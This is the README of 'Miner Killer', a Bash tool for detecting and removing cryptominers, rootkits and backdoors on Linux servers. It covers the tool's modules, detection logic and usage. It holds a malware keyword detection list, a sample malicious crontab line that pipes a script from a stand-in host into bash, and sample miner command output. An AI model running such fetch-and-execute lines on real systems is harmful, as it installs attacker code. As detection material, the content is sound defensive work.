<div align="center">

# Miner Killer

> Linux Server Incident Response Tool - Cryptominer Detection & Removal

[![Shell Script](https://img.shields.io/badge/Shell-Bash-green.svg)](https://www.gnu.org/software/bash/)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Linux-orange.svg)](https://www.kernel.org/)

English | [中文](README.md)

</div>

---

## 🚀 Quick Start

### Method 1: Direct Download (Recommended)

```bash
curl -O https://raw.githubusercontent.com/gkdgkd123/miner_killer/main/miner_killer.sh
chmod +x miner_killer.sh
sudo ./miner_killer.sh
```

### Method 2: Clone Repository

```bash
git clone https://github.com/gkdgkd123/miner_killer.git
cd miner_killer
chmod +x miner_killer.sh
sudo ./miner_killer.sh
```

### Method 3: Air-Gapped Deployment

For internal networks or servers without internet access:

```bash
# Copy the complete script to target server
cat > /tmp/miner_killer.sh << 'EOF'
[Paste complete miner_killer.sh content]
EOF

chmod +x /tmp/miner_killer.sh
sudo /tmp/miner_killer.sh
```

---

## ⚠️ Disclaimer

**This script involves process termination and file deletion operations that may affect system stability. Before use:**

- Test in a non-production environment
- Backup critical data
- Understand the impact of each operation
- Carefully confirm deletion prompts

**The author is not responsible for data loss, service interruption, or system failures caused by using this script.**

---

## 📋 Overview

Miner Killer is an incident response tool designed for Linux servers to detect and remove cryptominers, backdoor accounts, malicious processes, and persistence attacks. The script uses an interactive design where all dangerous operations require manual confirmation to ensure safety and control.

### Core Capabilities

- **11 Audit Modules**: Comprehensive detection covering processes, network, persistence, containers, accounts, etc.
- **IP Intelligence Integration**: Automatic geolocation and reputation lookup for external IPs
- **Smart Detection Logic**: Triple detection via CPU usage + keyword matching + network connections
- **Security Protection**: Path whitelist, process group termination, anti-resurrection design
- **Automatic Quarantine**: Auto-backup to quarantine directory before deletion, supports recovery

---

## 🌟 Features

### 🔍 Detection Capabilities

| Module | Function | Detection Targets |
|--------|----------|-------------------|
| **System Overview** | System load, logged users, listening ports, DNS config | Abnormal logins, suspicious ports, DNS hijacking |
| **Process Analysis** | CPU usage, network connections, malicious keywords | Mining processes, backdoors, hidden processes |
| **System Integrity** | /etc/hosts, Shell config files | Domain hijacking, startup script backdoors |
| **Container Security** | Docker container resource usage | Malicious containers, mining images |
| **PM2 Daemon** | Node.js process manager | Hidden malicious JS scripts |
| **Persistence** | Crontab, Systemd services | Scheduled task backdoors, malicious services |
| **Rootkit** | LD_PRELOAD, kernel modules, hidden files | Kernel-level backdoors, rootkit traces |
| **SSH Audit** | authorized_keys files | Unauthorized public keys, backdoor keys |
| **Network Connections** | ESTABLISHED connections + IP intelligence | External mining pools, C2 servers |
| **DNS Audit** | /etc/resolv.conf | Malicious DNS servers |
| **Service Files** | Systemd service network configs | External addresses in service files |
| **/etc/hosts** | hosts file IP intelligence | Suspicious domain resolutions |

### 🛡️ Security Mechanisms

**Path Safety Check**

- Whitelist mechanism: Only allows deletion in `/tmp`, `/var/tmp`, `/dev/shm`, `/root`, `/home`
- Systemd protection: `/etc/systemd` and `/usr/lib/systemd` only allow `.service` file deletion
- Prevents accidental deletion of system core components

**Process Termination Strategy**

```text
1. kill -STOP $pid        # Freeze process, prevent watchdog resurrection
2. Delete executable      # Remove underlying binary
3. kill -9 -$pid          # Kill entire process group
```

**Crontab Protection**

- Does not directly clear crontab files
- Invokes editor for manual malicious line removal
- Automatic backup of original files

### 📊 IP Intelligence Query

Integrated with ipinfo.dkly.net API, automatically queries external IPs for:

- Geolocation (country, region, city)
- Organization/ISP
- Reputation score (0-100, lower is more suspicious)

**Trigger Scenarios**:

- Process external connections
- Network connection panorama scan
- DNS server audit
- IPs in Systemd service files
- IPs in /etc/hosts file

---

## 🏗️ System Architecture

```text
┌─────────────────────────────────────────────────────────────┐
│                   Miner Killer Main Flow                     │
└─────────────────────────────────────────────────────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│ Initialization│    │ Malware DB    │    │ IP Intel API  │
│ - Color output│    │ - Keywords    │    │ - ipinfo.io   │
│ - Log system  │    │ - Whitelist   │    │ - Geolocation │
│ - Lock mech   │    │ - Regex rules │    │ - Reputation  │
└───────────────┘    └───────────────┘    └───────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│ 0. Overview   │    │ 1. Process    │    │ 2. Integrity  │
│ - Load/Users  │    │ - CPU detect  │    │ - /etc/hosts  │
│ - Listen ports│    │ - Network conn│    │ - Shell config│
│ - Login hist  │    │ - Keyword mtch│    │ - Startup scr │
└───────────────┘    └───────────────┘    └───────────────┘
        │                     │                     │
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│ 3. Docker     │    │ 4. PM2        │    │ 5. Persistence│
│ - Container   │    │ - Process list│    │ - Crontab     │
│ - Resource    │    │ - Script path │    │ - Systemd     │
│ - Image audit │    │ - Keyword det │    │ - Service file│
└───────────────┘    └───────────────┘    └───────────────┘
        │                     │                     │
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│ 6. Rootkit    │    │ 7. SSH Audit  │    │ 8. Network    │
│ - LD_PRELOAD  │    │ - Public keys │    │ - Conn list   │
│ - Kernel taint│    │ - All users   │    │ - IP intel    │
│ - Hidden files│    │ - Backdoor key│    │ - External det│
└───────────────┘    └───────────────┘    └───────────────┘
        │                     │                     │
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│ 9. DNS Audit  │    │ 10. Service   │    │ 11. Hosts Int │
│ - resolv.conf │    │ - Service file│    │ - IP resolve  │
│ - DNS hijack  │    │ - Network cfg │    │ - Intel query │
└───────────────┘    └───────────────┘    └───────────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │ Quarantine & Clean│
                    │ - Auto backup     │
                    │ - Safe deletion   │
                    │ - Log recording   │
                    └───────────────────┘
```

---

## 🎯 Detection Logic

### Process Suspicion Determination

The script uses **triple detection logic** - any condition triggers suspicion:

```bash
# 1. CPU usage > 8%
if (( $(echo "$cpu_usage > 8.0" | bc -l) )); then
    is_suspicious=1
fi

# 2. Process name or command line contains malicious keywords
if echo "$proc_name $cmd_line" | grep -iqE "$MALWARE_KEYWORDS"; then
    is_suspicious=1
fi

# 3. External network connection exists (excluding 127.0.0.1)
if [ ! -z "$target_ip" ]; then
    is_suspicious=1
fi

# 4. Executable in suspicious path
if [[ "$exe_path" == /tmp* ]] || [[ "$exe_path" == /dev/shm* ]]; then
    is_suspicious=1
fi
```

### Malware Signature Database

```bash
MALWARE_KEYWORDS="miner|pool|xmrig|kinsing|c3pool|nanopool|f2pool|
                  stratum|wallet|crypto|eth|xmr|monero|ocean|
                  nicehash|hash|coins|kdevtmpfs|java-c|log_rot|
                  watchbog|kthrotlds"
```

---

## 📈 Performance Metrics

| Metric | Value | Description |
|--------|-------|-------------|
| **Scan Speed** | ~30-60 sec | Complete 11-module scan (depends on system scale) |
| **False Positive Rate** | < 5% | Whitelist mechanism + manual confirmation |
| **Resource Usage** | < 50MB RAM | Pure Bash implementation, no extra dependencies |
| **Log Size** | ~100KB/run | Auto-saved to `/var/log/miner_killer_*.log` |
| **Quarantine Backup** | Automatic | Backup before deletion to `/tmp/malware_quarantine.*` |

---

## 🔬 Key Innovations

1. **Anti-Process Resurrection**
   - Traditional: `kill -9 $pid` → watchdog immediately resurrects
   - This script: `kill -STOP` freeze → delete file → `kill -9 -$pid` kill process group

2. **Path Safety Whitelist**
   - Prevents accidental deletion of system critical files
   - Systemd paths only allow `.service` file deletion
   - Refuses deletion of `/usr/bin`, `/usr/sbin`, etc.

3. **Crontab Protection**
   - Does not directly clear crontab (avoids destroying business scheduled tasks)
   - Invokes editor for manual malicious line removal
   - Automatic backup of original files

4. **IP Intelligence Automation**
   - Integrated ipinfo.dkly.net API
   - Auto-queries geolocation and reputation of external IPs
   - Covers processes, network, DNS, service files, etc.

5. **CPU Validation Robustness**
   - Handles empty values and non-numeric input
   - Regex validation `^[0-9]+(\.[0-9]+)?$`
   - Avoids awk syntax errors

---

## 🛠️ Requirements

### Required

- **Bash** 4.0+
- **Root privileges**

### Optional (Auto-detected)

| Tool | Purpose | Impact if Missing |
|------|---------|-------------------|
| `netstat` / `ss` | Network connection scan | Cannot detect network connections |
| `docker` | Container scan | Skip Docker module |
| `pm2` | Node.js process manager | Skip PM2 module |
| `systemctl` | Systemd service management | Cannot detect service files |
| `python3` | JSON parsing (IP intel) | Fallback to grep/sed parsing |
| `curl` | API requests | Cannot query IP intelligence |
| `chattr` | File attribute modification | Cannot remove immutable flags |
| `iptables` | Firewall rules | Cannot auto-block IPs |

---

## 📂 Project Structure

```text
miner_killer/
├── miner_killer.sh          # Main script
├── README.md                # Chinese documentation
├── README_EN.md             # English documentation
└── LICENSE                  # MIT License
```

---

## 🔧 Configuration

### IP Intelligence API Key

Built-in official free API key, customize if needed:

```bash
# Modify line 25 in script
IPINFO_API_KEY="your_api_key_here"
```

Get API Key: <https://ipinfo.dkly.net/>

### Malware Signature Database

Customize keywords based on your environment (line 28):

```bash
MALWARE_KEYWORDS="miner|pool|xmrig|your_custom_keyword"
```

### Whitelist

Add trusted processes to whitelist (line 31):

```bash
WHITELIST="systemd-journal|systemd-udevd|your_trusted_process"
```

---

## 📝 Usage Examples

### Scenario 1: Server CPU Abnormally High

```bash
# Run script
sudo ./miner_killer.sh

# Example output
------------------------------------------------------------
► PID: 12345 | Name: xmrig | CPU: 95.2%
  Reason: [High CPU] [Keyword] [Network]
  Path  : /tmp/.hidden/xmrig
  Cmd   : ./xmrig -o pool.minexmr.com:4444 -u wallet...
  Net   : Connected to: 45.76.102.45 [United States] [Vultr Holdings LLC] [Score: 15]

Is this MALICIOUS? Kill & Delete? (y/Enter to skip): y
Block IP 45.76.102.45 in iptables? (y/n): y
[✔] IP 45.76.102.45 blocked.
KILLING PID 12345...
[Safe] Quarantined to: /tmp/malware_quarantine.XXXXXX/xmrig_1234567890
[✔] Deleted: /tmp/.hidden/xmrig
```

### Scenario 2: Malicious Crontab Detected

```bash
# Script output
[1] /var/spool/cron/root [SUSPICIOUS]

Select Number to INSPECT CONTENT (Enter to continue): 1
================ FILE CONTENT: /var/spool/cron/root =================
*/5 * * * * curl -s http://malicious.com/miner.sh | bash
============================================================

Edit this file manually to remove malicious lines? (y/n): y
# Editor opens automatically, manually delete malicious lines
```

### Scenario 3: Backdoor Account Found

```bash
# Script output
[!!!] DANGER: Backdoor user (UID 0) found: hacker

Delete user 'hacker'? (y/n): y
[✔] User 'hacker' deleted.
```

---

## 🐛 Troubleshooting

### Issue 1: Script Won't Run

```bash
# Check permissions
ls -l miner_killer.sh
# Should show -rwxr-xr-x

# Add execute permission
chmod +x miner_killer.sh

# Check if running as root
whoami
# Should show root
```

### Issue 2: IP Intelligence Query Failed

```bash
# Check network connectivity
curl -s https://ipinfo.dkly.net/api/?key=test&ip=8.8.8.8

# Check if Python3 is installed
python3 --version

# Install Python3 manually (CentOS)
yum install python3 -y

# Install Python3 manually (Ubuntu)
apt install python3 -y
```

### Issue 3: Important File Accidentally Deleted

```bash
# Recover from quarantine directory
ls /tmp/malware_quarantine.*

# Restore file
cp /tmp/malware_quarantine.XXXXXX/filename /original/path/
```

---

## 🤝 Contributing

Issues and Pull Requests are welcome!

1. Fork this repository
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request

---

## 📄 License

This project is licensed under the MIT License - see [LICENSE](LICENSE) file for details

---

## 🙏 Acknowledgments

- [ipinfo.dkly.net](https://ipinfo.dkly.net/) - IP Intelligence API
- Linux security community best practices
- All contributors and users

---

## 📧 Contact

- GitHub Issues: <https://github.com/gkdgkd123/miner_killer/issues>
- Author: gkdgkd123

---

**⚠️ Reminder: This tool is for legitimate security audits and incident response only. Ensure you have authorization from the system owner before use.**
